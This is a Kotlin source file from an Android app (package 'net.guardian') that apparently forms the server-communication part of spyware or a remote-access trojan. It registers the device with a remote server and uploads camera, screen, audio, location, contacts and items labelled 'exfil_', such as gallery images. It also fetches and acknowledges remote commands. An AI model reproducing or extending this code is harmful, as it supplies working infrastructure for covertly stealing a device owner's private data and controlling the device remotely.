package net.guardian

import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.DataOutputStream
import java.io.File
import java.net.HttpURLConnection
import java.net.URL

object ServerUploader {
    private const val TAG = "ServerUploader"
    var serverUrl = BuildConfig.DEFAULT_SERVER_URL
    var authToken = BuildConfig.AUTH_TOKEN
    var deviceId = ""

    private fun postMultipart(url: String, fields: Map<String, String>, fileField: String? = null, file: File? = null, fileName: String? = null, fileMime: String? = null): Boolean {
        return try {
            val boundary = "Boundary${System.currentTimeMillis()}"
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = 3000
            conn.readTimeout = 3000
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            if (authToken.isNotEmpty()) {
                conn.setRequestProperty("Authorization", "Bearer $authToken")
            }

            DataOutputStream(conn.outputStream).use { dos ->
                fields.forEach { (key, value) ->
                    dos.writeBytes("--$boundary\r\n")
                    dos.writeBytes("Content-Disposition: form-data; name=\"$key\"\r\n\r\n")
                    dos.writeBytes("$value\r\n")
                }
                if (file != null && fileField != null) {
                    val name = fileName ?: file.name
                    val mime = fileMime ?: "application/octet-stream"
                    dos.writeBytes("--$boundary\r\n")
                    dos.writeBytes("Content-Disposition: form-data; name=\"$fileField\"; filename=\"$name\"\r\n")
                    dos.writeBytes("Content-Type: $mime\r\n\r\n")
                    file.inputStream().use { it.copyTo(dos) }
                    dos.writeBytes("\r\n")
                }
                dos.writeBytes("--$boundary--\r\n")
            }

            conn.responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "postMultipart failed: ${e.message}", e)
            false
        }
    }

    private fun postJson(url: String, json: String): Boolean {
        return try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = 3000
            conn.readTimeout = 3000
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json")
            if (authToken.isNotEmpty()) {
                conn.setRequestProperty("Authorization", "Bearer $authToken")
            }
            conn.outputStream.write(json.toByteArray())
            conn.responseCode in 200..299
        } catch (e: Exception) {
            Log.e(TAG, "postJson failed: ${e.message}", e)
            false
        }
    }

    fun registerDevice(deviceId: String, deviceName: String, deviceIp: String): Boolean {
        val json = JSONObject().apply {
            put("device_id", deviceId)
            put("device_name", deviceName)
            put("device_ip", deviceIp)
        }
        return postJson("$serverUrl/api/devices/register", json.toString())
    }

    fun uploadCapture(type: String, data: String = "", file: File? = null): Boolean {
        val fields = mutableMapOf("type" to type, "device_id" to deviceId, "data" to data)
        val mime = when {
            type == "camera" || type == "screen" || type == "surveillance_motion" -> "image/jpeg"
            type == "surveillance_video" || type == "audio" -> "video/mp4"
            type == "surveillance_audio" -> "audio/mpeg"
            type == "exfil_gallery" -> "image/jpeg"
            type.startsWith("exfil_") || type == "surveillance_location" -> "application/json"
            else -> "application/octet-stream"
        }
        return postMultipart("$serverUrl/api/capture", fields, "file", file, file?.name, mime)
    }

    fun uploadBytes(type: String, data: String = "", bytes: ByteArray? = null): Boolean {
        val fields = mutableMapOf("type" to type, "device_id" to deviceId, "data" to data)
        if (bytes != null) {
            val ext = when {
                type.startsWith("exfil_") || type == "surveillance_location" -> "json"
                else -> "jpg"
            }
            val mime = when {
                type.startsWith("exfil_") || type == "surveillance_location" -> "application/json"
                else -> "image/jpeg"
            }
            val tmp = File.createTempFile("upload", ".$ext")
            tmp.writeBytes(bytes)
            val result = postMultipart("$serverUrl/api/capture", fields, "file", tmp, "$type.$ext", mime)
            tmp.delete()
            return result
        }
        return postMultipart("$serverUrl/api/capture", fields)
    }

    fun getPendingCommands(): List<Map<String, Any?>> {
        return try {
            val url = if (deviceId.isNotEmpty()) "$serverUrl/api/commands/pending?device_id=$deviceId" else "$serverUrl/api/commands/pending"
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = 3000
            conn.readTimeout = 3000
            val body = conn.inputStream.bufferedReader().readText()
            val arr = JSONArray(body)
            (0 until arr.length()).map { i ->
                val obj = arr.getJSONObject(i)
                obj.keys().asSequence().associateWith { obj.get(it) }
            }
        } catch (_: Exception) { emptyList() }
    }

    fun signal(command: String): Boolean {
        return postMultipart("$serverUrl/api/commands/signal",
            mapOf("command" to command))
    }

    fun ackCommand(id: Int, status: String, result: String): Boolean {
        return postMultipart("$serverUrl/api/commands/ack",
            mapOf("id" to id.toString(), "status" to status, "result" to result))
    }

    fun uploadScreenFrame(status: String): Boolean {
        return postMultipart("$serverUrl/api/screen/heartbeat",
            mapOf("status" to status))
    }

    fun uploadContacts(contactsJson: String): Boolean {
        return postMultipart("$serverUrl/api/contacts",
            mapOf("device_id" to deviceId, "contacts" to contactsJson))
    }

    fun sendAlert(type: String, message: String): Boolean {
        val json = JSONObject().apply {
            put("type", type)
            put("message", message)
            put("source", "surveillance")
            put("device_id", deviceId)
        }
        return postJson("$serverUrl/api/threat/alert", json.toString())
    }
}
